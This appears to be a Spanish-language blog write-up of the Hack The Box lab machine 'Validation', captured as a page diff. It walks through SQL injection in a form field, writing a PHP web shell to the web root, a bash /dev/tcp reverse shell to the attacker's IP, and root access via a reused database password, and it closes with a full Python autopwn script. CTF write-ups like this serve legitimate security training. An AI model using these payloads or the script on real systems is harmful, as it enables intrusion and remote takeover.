@@ -1,0 +1,800 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Validation HTB Write-up - grafis Blog</title>
+<meta name="description" content="En este artículo comparto el write up de la máquina Validation de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="grafis Blog">
+<meta property="og:title" content="Validation HTB Write-up">
+<meta property="og:url" content="http://localhost:4000/Validation/">
+
+
+  <meta property="og:description" content="En este artículo comparto el write up de la máquina Validation de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/imagenes/Validation/Validation_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-02-08T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/Validation/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "grafis",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="grafis Blog Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Validation HTB Write-up</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="grafis" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">grafis</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Estudiante de Ingeniería Civil en Informática y Telecomunicaciones
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/mirko-babic-velásquez-4979bb219" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/grafis0" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Validation HTB Write-up">
+    <meta itemprop="description" content="En este artículo comparto el write up de la máquina Validation de Hack The Box">
+    <meta itemprop="datePublished" content="February 08, 2023">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Validation HTB Write-up
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2023-02-08T00:00:00-05:00">February 08, 2023 </time>&emsp;
+          
+          
+        </p>
+        <p align="center">
+<img src="/imagenes/Validation/Validation_banner.png" width="550" height="250" />
+</p>
+
+<h1 id="resumen"><a href="#header-2"></a>Resumen</h1>
+
+<p>Saludos, en esta oportunidad vamos a resolver la máquina de <strong>Hack The Box</strong> llamada <strong>Validation</strong>, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:</p>
+
+<ul>
+  <li>Enumeración del sistema.</li>
+  <li>Uso de Burpsuite.</li>
+  <li>SQL Injection.</li>
+  <li>Utilización de SQL Injection para ganar acceso al sistema.</li>
+  <li>Automatización de la intrusión en python.</li>
+</ul>
+
+<h2 id="reconocimiento-y-enumeración"><a href="#header-2"></a>Reconocimiento y Enumeración</h2>
+
+<p>En primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando <code class="language-plaintext highlighter-rouge">ping</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.11.116
+PING 10.10.11.116 (10.10.11.116) 56(84) bytes of data.
+64 bytes from 10.10.11.116: icmp_seq=1 ttl=63 time=136 ms
+</code></pre></div></div>
+<p>Se observa que existe una correcta conexión con la máquina.</p>
+
+<p>Para realizar un reconocimiento activo se utilizará la herramienta <code class="language-plaintext highlighter-rouge">nmap</code>, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro <code class="language-plaintext highlighter-rouge">-sS</code> el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -p- -sS -open -min-rate 5000 10.10.11.116 -oG Ports
+</code></pre></div></div>
+<p>Al finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+4566/tcp open  kwtc
+8080/tcp open  http-proxy
+</code></pre></div></div>
+<p>Observamos un puerto web. Vamos a realizar un escaneo de servicios para identificar versiones:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sCV -p22,80,4566,8080 10.10.11.116
+</code></pre></div></div>
+
+<p>Como resultado del escaneo tenemos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 d8f5efd2d3f98dadc6cf24859426ef7a (RSA)
+|   256 463d6bcba819eb6ad06886948673e172 (ECDSA)
+|_  256 7032d7e377c14acf472adee5087af87a (ED25519)
+80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
+|_http-server-header: Apache/2.4.48 (Debian)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+4566/tcp open  http    nginx
+|_http-title: 403 Forbidden
+8080/tcp open  http    nginx
+|_http-title: 502 Bad Gateway
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>Tenemos la versión de ssh y el servicio web. Vamos a analizar este servicio utilizando en primer lugar la herramienta <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb 10.10.11.116
+
+http://10.10.11.116 [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.48 (Debian)], IP[10.10.11.116], JQuery, PHP[7.4.23], Script, X-Powered-By[PHP/7.4.23]
+</code></pre></div></div>
+<p>Tenemos algunas de las tecnologías utilizadas en esta página, vamos a revisarla:</p>
+
+<p><img src="/imagenes/Validation/validationweb.png" alt="" /></p>
+
+<p>Vemos que tenemos un campo <strong>username</strong>, probaremos con el usuario <strong>test</strong> para ver que ocurre:</p>
+
+<p><img src="/imagenes/Validation/validationweb2.png" alt="" /></p>
+
+<h2 id="explotación"><a href="#header-2"></a>Explotación</h2>
+
+<p>Intentaremos probar si es vulnerable a <strong>XSS</strong>:</p>
+
+<p><img src="/imagenes/Validation/validationweb3.png" alt="" /></p>
+
+<p>Al ingresar:</p>
+
+<p><img src="/imagenes/Validation/validationweb4.png" alt="" /></p>
+
+<p>Tenemos que es vulnerable a <strong>XSS</strong>, sin embargo, esto no nos sirve porque esta página no tiene algún tipo de autenticación, no podemos por ejemplo intentar robar cookies de sesión, por lo tanto, intentaremos probar si es vulnerable a <strong>sql injection</strong>:</p>
+
+<p><img src="/imagenes/Validation/validationweb5.png" alt="" /></p>
+
+<p>Al parece no ocurre nada especial al agregar <strong>‘</strong>, pero utilizaremos <code class="language-plaintext highlighter-rouge">Burpsuite</code> para manejar las peticiones de manera más cómoda, cuando interceptamos la petición tenemos lo siguiente:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST / HTTP/1.1
+Host: 10.10.11.116
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 28
+Origin: http://10.10.11.116
+Connection: close
+Referer: http://10.10.11.116/
+Cookie: user=098f6bcd4621d373cade4e832627b4f6
+Upgrade-Insecure-Requests: 1
+
+username=test&amp;country=Brazil
+</code></pre></div></div>
+
+<p>Vemos que en la petición por <strong>POST</strong> va <strong>username</strong> y <strong>country</strong>, por lo tanto, intentamos agregar una comilla simple al final de brazil para ver que sucede:</p>
+
+<p><img src="/imagenes/Validation/validationsqlerror.png" alt="" /></p>
+
+<p>Se observa un error, esto nos quiere decir que es vulnerable a <strong>SQL Injection</strong>, así que probaremos payloads para ver si podemos enumerar información, por ejemplo. intentaremos utilizar union en la data:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username=test&amp;country=Brazil' union select 'testing'-- -
+</code></pre></div></div>
+<p>En la respuesta en <strong>raw</strong> observamos que está testing:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;li class='text-white'&gt;testing&lt;/li&gt;
+</code></pre></div></div>
+
+<p>Por lo tanto, intentaremos enumerar la base de datos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username=test&amp;country=Brazil' union select database()-- -
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;li class='text-white'&gt;registration&lt;/li&gt;
+</code></pre></div></div>
+
+<p>Observamos que la database tiene como nombre <strong>registration</strong>, podemos intentar enumerar la versión:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username=test&amp;country=Brazil' union select version()-- -
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;li class='text-white'&gt;10.5.11-MariaDB-1&lt;/li&gt;
+</code></pre></div></div>
+
+<p>También podemos enumerar las otras bases de datos dentro del sistema:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username=test&amp;country=Brazil' union select schema_name from information_schema.schemata-- -
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;li class='text-white'&gt;information_schema&lt;/li&gt;&lt;li class='text-white'&gt;performance_schema&lt;/li&gt;&lt;li class='text-white'&gt;mysql&lt;/li&gt;&lt;li class='text-white'&gt;registration&lt;/li&gt;
+</code></pre></div></div>
+
+<p>Podemos ver las diferentes bases de datos del sistema, en este punto podríamos probar si tenemos capacidad de escritura utilizando <strong>into outfile</strong> dentro de /var/www/html, pues el servidor está corriendo allí según el error:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username=test&amp;country=Brazil' union select "testing" into outfile "/var/www/html/testing.txt"-- -
+</code></pre></div></div>
+
+<p>Vamos entonces hacia el navegador para ver si ha creado el recurso:</p>
+
+<p><img src="/imagenes/Validation/validationweb6.png" alt="" /></p>
+
+<p>Observamos que si se creó. Por lo tanto, tenemos una vía potencial de ganar acceso a la máquina, esto lo realizaremos intentando subir un archivo malicioso para poder entablar una conexión hacia nuestra máquina desde el servidor, en primer lugar vamos a crear el siguiente payload:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username=test&amp;country=Brazil' union select "&lt;?php system($_REQUEST['cmd']); ?&gt;" into outfile "/var/www/html/evil.php"-- -
+</code></pre></div></div>
+<p>Al ingresar al recursos creado tenemos:</p>
+
+<p><img src="/imagenes/Validation/validationweb7.png" alt="" /></p>
+
+<p>Por lo tanto, ahora solo basta con asignarle un valor a la variable <strong>cmd</strong> para ejecutar comandos:</p>
+
+<p><img src="/imagenes/Validation/validationweb8.png" alt="" /></p>
+
+<p>El siguiente paso es entablar una conexión reversa con nuestra máquina, en este caso usaremos lo siguiente:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash -c 'bash -i &gt;%26 /dev/tcp/10.10.14.17/1234 0&gt;%261'
+</code></pre></div></div>
+
+<p>Cabe destacar que corresponde a una variación de las reverse shell de <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a>, debido a hay que aplicar url encode a los caracteres especiales para que los pueda interpretar, entonces:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.11.116/evil.php?cmd=bash -c 'bash -i &gt;%26 /dev/tcp/10.10.14.17/1234 0&gt;261'
+</code></pre></div></div>
+
+<p>Luego de ejecutar la instrucción, ya teniamos <code class="language-plaintext highlighter-rouge">netcat</code> previamente escuchando por el puerto 1234:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.17] from (UNKNOWN) [10.10.11.116] 37056
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@validation:/var/www/html$ whoami
+whoami
+www-data
+</code></pre></div></div>
+
+<p>Podemos observar que hemos ingresado correctamente a la máquina.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@validation:/var/www/html$ ls
+ls
+account.php  config.php  css  index.php  js
+</code></pre></div></div>
+
+<p>Ahora buscaremos la flag de usuario:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@validation:/home/htb# cat user.txt
+cat user.txt
+97661213f37a875cc5951
+</code></pre></div></div>
+
+<p>¡Bien! tenemos la flag.</p>
+
+<h2 id="escalada-de-privilegios"><a href="#header-2"></a>Escalada de privilegios</h2>
+
+<p>En primer lugar, inspeccionaremos estos archivos por si hay información:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@validation:/var/www/html$ cat config.php
+cat config.php
+&lt;?php
+  $servername = "127.0.0.1";
+  $username = "uhc";
+  $password = "uhc-9qual-global-pw";
+  $dbname = "registration";
+
+  $conn = new mysqli($servername, $username, $password, $dbname);
+?&gt;
+</code></pre></div></div>
+<p>Observamos un usuario y una contraseña. Sin embargo, el usuario no existe:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@validation:/var/www/html$ id uhc
+id uhc
+id: 'uhc': no such user
+</code></pre></div></div>
+
+<p>Pero como tenemos la contraseña, si tenemos suerte podría ser la de administrador:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@validation:/var/www/html$ su root
+su root
+Password: uhc-9qual-global-pw
+
+root@validation:/var/www/html# whoami
+whoami
+root
+root@validation:/var/www/html# 
+</code></pre></div></div>
+<p>Como la contraseña resultó ser la de root, nos hemos convertido en admin, ahora buscaremos la flag de root:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@validation:~# cat root.txt
+cat root.txt
+f9f6320d7a1fc7f4d4a0
+</code></pre></div></div>
+
+<p>Hemos vulnerado completamente la máquina hasta ser administradores.</p>
+
+<p>Sin embargo, como la escalada ha sido bastante lamentable, haremos un script en python para automatizar la intrusión:</p>
+
+<p>En primer lugar, utilizaremos la libreria <strong>requests</strong> y <strong>pwn</strong> para realizar las conexiones, empezaremos definiendo las IP:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">target</span> <span class="o">=</span> <span class="s">'http://10.10.11.116'</span>
+<span class="n">target2</span> <span class="o">=</span> <span class="s">'http://10.10.11.116/evil.php'</span>
+<span class="n">ip</span> <span class="o">=</span> <span class="s">'10.10.14.17'</span> <span class="c1"># cambiar esto
+</span><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Luego, después de definir las variables globales haremos una función llamada <strong>sqli</strong>, la cual hará la creación del archivo malicioso en el servidor web:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">sqli</span><span class="p">():</span>
+
+    <span class="n">payload</span><span class="o">=</span>  <span class="s">"""Brazil' union select "&lt;?php system($_REQUEST['cmd']); ?&gt;" into outfile "/var/www/html/evil.php"-- -"""</span>
+    
+    <span class="n">post_data</span> <span class="o">=</span>  <span class="p">{</span>
+        <span class="s">'username'</span><span class="p">:</span><span class="s">'test'</span><span class="p">,</span>
+        <span class="s">'country'</span><span class="p">:</span><span class="n">payload</span>
+    
+    <span class="p">}</span>
+
+    <span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Luego, creamos la función que entablará la conexión reversa a nuestra máquina:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">reverse</span><span class="p">():</span>
+
+    <span class="n">payload</span> <span class="o">=</span><span class="s">"bash -c 'bash -i &gt;&amp; /dev/tcp/%s/1234 0&gt;&amp;1'"</span> <span class="o">%</span><span class="n">ip</span>
+
+    <span class="n">post_data</span><span class="o">=</span><span class="p">{</span>
+
+        <span class="s">'cmd'</span><span class="p">:</span><span class="n">payload</span>
+
+    <span class="p">}</span>
+
+    <span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">target2</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
+</code></pre></div></div>
+<p>Finalmente, tenemos el main, en el cual llamaremos a estas dos funciones:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">sqli</span><span class="p">()</span>
+    <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">reverse</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">()).</span><span class="n">start</span><span class="p">()</span>
+    <span class="n">shell</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="mi">1234</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">).</span><span class="n">wait_for_connection</span><span class="p">()</span>
+    <span class="n">shell</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+<p>En primer lugar, llamamos a la función <strong>sqli</strong> para que suba el archivo malicioso a la web. En segundo lugar, trabajamos con hilos para que la función reverse se ejecute correctamente mientras estamos esperando una conexión por el puerto 1234 para luego tener una consola interactiva.</p>
+
+<p>Con todo lo anterior, basta con cambiar la IP dependiendo de cual tengas y al ejecutar el código tendras una reverse shell para el usuario <strong>www-data</strong>.</p>
+
+<p>El código completo es:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+
+<span class="n">target</span> <span class="o">=</span> <span class="s">'http://10.10.11.116'</span>
+<span class="n">target2</span> <span class="o">=</span> <span class="s">'http://10.10.11.116/evil.php'</span>
+<span class="n">ip</span> <span class="o">=</span> <span class="s">'10.10.14.17'</span> <span class="c1"># cambiar esto
+</span><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">sqli</span><span class="p">():</span>
+
+    <span class="n">payload</span><span class="o">=</span>  <span class="s">"""Brazil' union select "&lt;?php system($_REQUEST['cmd']); ?&gt;" into outfile "/var/www/html/evil.php"-- -"""</span>
+    
+    <span class="n">post_data</span> <span class="o">=</span>  <span class="p">{</span>
+        <span class="s">'username'</span><span class="p">:</span><span class="s">'test'</span><span class="p">,</span>
+        <span class="s">'country'</span><span class="p">:</span><span class="n">payload</span>
+    
+    <span class="p">}</span>
+
+    <span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">reverse</span><span class="p">():</span>
+
+    <span class="n">payload</span> <span class="o">=</span><span class="s">"bash -c 'bash -i &gt;&amp; /dev/tcp/%s/1234 0&gt;&amp;1'"</span> <span class="o">%</span><span class="n">ip</span>
+
+    <span class="n">post_data</span><span class="o">=</span><span class="p">{</span>
+
+        <span class="s">'cmd'</span><span class="p">:</span><span class="n">payload</span>
+
+    <span class="p">}</span>
+
+    <span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">target2</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">sqli</span><span class="p">()</span>
+    <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">reverse</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">()).</span><span class="n">start</span><span class="p">()</span>
+    <span class="n">shell</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="mi">1234</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">).</span><span class="n">wait_for_connection</span><span class="p">()</span>
+    <span class="n">shell</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<p>!Listo!</p>
+
+<p>Hemos realizado la automatización de la intrusión.</p>
+
+<p>Nos vemos, hasta la próxima.</p>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#autopwn" class="page__taxonomy-item" rel="tag">Autopwn</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#burpsuite" class="page__taxonomy-item" rel="tag">Burpsuite</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#enumeration" class="page__taxonomy-item" rel="tag">Enumeration</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#scripting" class="page__taxonomy-item" rel="tag">Scripting</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#sqli" class="page__taxonomy-item" rel="tag">SQLi</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">Web</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#hack-the-box" class="page__taxonomy-item" rel="tag">Hack The Box</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#write-up" class="page__taxonomy-item" rel="tag">Write up</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2023-02-08T00:00:00-05:00">February 08, 2023</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/Timelapse/" class="pagination--pager" title="Timelapse HTB Write-up
+">Previous</a>
+    
+    
+      <a href="/Horizontall/" class="pagination--pager" title="Horizontall HTB Write-up
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2023 grafis</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
